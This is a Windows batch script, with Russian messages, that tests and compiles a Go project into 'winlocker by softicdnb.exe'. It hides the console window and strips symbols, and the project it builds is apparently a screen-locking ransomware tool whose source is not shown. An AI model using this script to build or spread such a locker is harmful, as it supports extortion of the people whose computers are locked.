@echo off
chcp 65001 >nul
where go >nul 2>nul
if errorlevel 1 (
  echo Установите Go с https://go.dev/dl/ и повторите запуск.
  pause
  exit /b 1
)
cd /d "%~dp0"
go test -buildvcs=false ./...
if errorlevel 1 goto failed
set GOOS=windows
set GOARCH=amd64
set CGO_ENABLED=0
go build -buildvcs=false -trimpath -ldflags="-H=windowsgui -s -w" -o "winlocker by softicdnb.exe" .
if errorlevel 1 goto failed
echo Готово: winlocker by softicdnb.exe
pause
exit /b 0
:failed
echo Сборка не завершена. Проверьте сообщение об ошибке выше.
pause
exit /b 1
